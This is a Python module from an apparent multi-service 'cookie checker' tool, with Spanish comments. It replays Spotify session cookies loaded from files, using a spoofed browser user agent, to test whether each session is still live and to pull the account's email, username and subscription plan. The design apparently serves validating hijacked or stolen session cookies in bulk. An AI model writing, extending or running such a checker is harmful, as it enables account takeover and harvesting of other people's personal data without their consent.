"""Spotify cookie checker — amai plan_live flow."""
from __future__ import annotations

import json
import re
import urllib.parse
from pathlib import Path
from typing import Optional

import requests

from ..models import CheckResult, finalize

UA = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
    "AppleWebKit/537.36 (KHTML, like Gecko) "
    "Chrome/131.0.0.0 Safari/537.36"
)


def normalize_plan(raw: str) -> str:
    s = (raw or "").strip()
    if not s:
        return "Unknown"
    low = s.lower()
    flat = (
        low.replace("á", "a")
        .replace("é", "e")
        .replace("í", "i")
        .replace("ó", "o")
        .replace("ú", "u")
        .replace("ü", "u")
    )
    if "family" in flat or "familiar" in flat:
        return "Premium Family"
    if "duo" in flat:
        return "Premium Duo"
    if "student" in flat or "estudiante" in flat:
        return "Premium Student"
    if "individual" in flat:
        return "Premium Individual"
    if "premium" in flat:
        return "Premium"
    if (
        "free" in flat
        or "gratuit" in flat
        or flat in ("gratis", "open", "spotify free")
    ):
        return "Free"
    return s


def build_session(cookies: dict[str, str]) -> requests.Session:
    s = requests.Session()
    # Se asigna solo al dominio base para evitar duplicación de cabeceras (HTTP 400/431)
    for n, v in cookies.items():
        s.cookies.set(n, v, domain=".spotify.com", path="/")
    return s


def extract_plan_from_event_props(cookies: dict[str, str]) -> Optional[str]:
    """Extrae el plan de las cookies de eventos (_hp5_event_props) si el HTML falla."""
    for k, v in cookies.items():
        if "_hp5_event_props" in k:
            try:
                decoded = urllib.parse.unquote(v)
                data = json.loads(decoded)
                plan = data.get("currentPlan")
                if plan:
                    return normalize_plan(str(plan))
            except Exception:
                pass
    return None


def check_cookies(
    cookies: dict[str, str],
    source_file: Optional[str] = None,
    *,
    jar=None,
    timeout: int = 20,
) -> CheckResult:
    lower = {k.lower(): v for k, v in cookies.items()}
    if (
        not lower.get("sp_dc")
        and not lower.get("sp_key")
        and not cookies.get("sp_dc")
        and not cookies.get("sp_key")
    ):
        return finalize(
            service="Spotify",
            valid=False,
            category="invalid",
            session_status="expired",
            reason="no_sp_dc",
            source_file=source_file,
        )

    session = build_session(cookies)
    headers = {
        "User-Agent": UA,
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
        "Referer": "https://www.spotify.com/",
    }

    email = None
    user_id = None
    valid = False
    session_status = "unknown"

    # 1. Verificar API de perfil
    try:
        r = session.get(
            "https://www.spotify.com/api/account-settings/v1/profile",
            headers={**headers, "Accept": "application/json"},
            timeout=timeout,
        )
        if r.status_code == 200:
            try:
                data = r.json()
                prof = data.get("profile") or {}
                email = prof.get("email")
                user_id = prof.get("username")
                valid = True
                session_status = "ok"
            except Exception:
                pass
        elif r.status_code in (401, 403):
            session_status = f"http_{r.status_code}"
    except requests.RequestException as e:
        return finalize(
            service="Spotify",
            valid=False,
            category="unknown",
            session_status="error",
            reason=f"error:{e}",
            source_file=source_file,
        )

    # 2. Verificar overview de la cuenta
    plan_live = "Unknown"
    try:
        r2 = session.get(
            "https://www.spotify.com/account/overview/",
            headers=headers,
            timeout=timeout,
            allow_redirects=True,
        )
    except requests.RequestException as e:
        if not valid:
            return finalize(
                service="Spotify",
                valid=False,
                category="unknown",
                session_status="error",
                reason=f"error:{e}",
                source_file=source_file,
            )
        return finalize(
            service="Spotify",
            valid=True,
            category="valid",
            plan_live=plan_live,
            email=email,
            user_id=user_id,
            session_status=session_status or "ok",
            reason="profile ok overview failed",
            source_file=source_file,
        )

    # Detección de redirección a login (elimina falsos positivos)
    final_url = r2.url.lower()
    if "accounts.spotify.com" in final_url and "login" in final_url:
        return finalize(
            service="Spotify",
            valid=False,
            category="invalid",
            session_status="expired",
            reason="redirected_to_login",
            source_file=source_file,
        )

    if r2.status_code == 200:
        html = r2.text

        # Búsqueda del plan en el HTML
        m = re.search(r'"planName"\s*:\s*"([^"]+)"', html)
        m2 = re.search(r'data-testid="plan-name-title"[^>]*>([^<]+)', html)
        m3 = re.search(r'"plan"\s*:\s*\{[^}]*"name"\s*:\s*"([^"]+)"', html)

        if m:
            plan_live = normalize_plan(m.group(1))
            valid = True
        elif m2:
            plan_live = normalize_plan(m2.group(1))
            valid = True
        elif m3:
            plan_live = normalize_plan(m3.group(1))
            valid = True
        elif 'data-testid="premium-tag"' in html:
            plan_live = "Premium"
            valid = True

        # Respaldo con cookie de eventos si el HTML no arrojó coincidencias
        if plan_live == "Unknown":
            cookie_plan = extract_plan_from_event_props(cookies)
            if cookie_plan:
                plan_live = cookie_plan
                valid = True

        if valid and session_status != "ok":
            session_status = "ok"

    if not valid:
        return finalize(
            service="Spotify",
            valid=False,
            category="invalid",
            session_status=f"http_{r2.status_code}",
            reason="overview_failed",
            source_file=source_file,
        )

    if valid and plan_live == "Unknown":
        plan_live = "Free"

    return finalize(
        service="Spotify",
        valid=valid,
        category="valid" if valid else "invalid",
        plan_live=plan_live,
        email=email,
        user_id=user_id,
        session_status=session_status,
        reason="spotify session ok",
        source_file=source_file,
    )


def check_file(path: Path) -> CheckResult:
    from ..load import load_file, requests_cookie_dict

    jar = load_file(path)
    return check_cookies(requests_cookie_dict(jar), source_file=path.name, jar=jar)